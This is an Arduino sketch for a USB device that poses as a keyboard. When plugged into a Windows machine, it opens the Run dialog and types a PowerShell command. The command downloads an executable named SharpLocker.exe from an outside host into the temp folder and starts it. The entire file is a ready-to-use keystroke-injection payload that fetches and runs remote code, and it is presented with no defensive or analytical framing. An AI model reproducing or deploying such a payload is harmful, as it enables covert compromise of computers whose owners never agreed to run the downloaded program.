#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  delay(4000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(150);

  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('");

  // ==== >URL BELOW< ====

  Keyboard.print("http://kali.seanlossef.com/SharpLocker/VisualStudio/bin/Debug/SharpLocker.exe");

  // ==== >URL ABOVE< ====

  Keyboard.print("','%TEMP%\\f.exe'); Start-Process \"%TEMP%\\f.exe\"");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
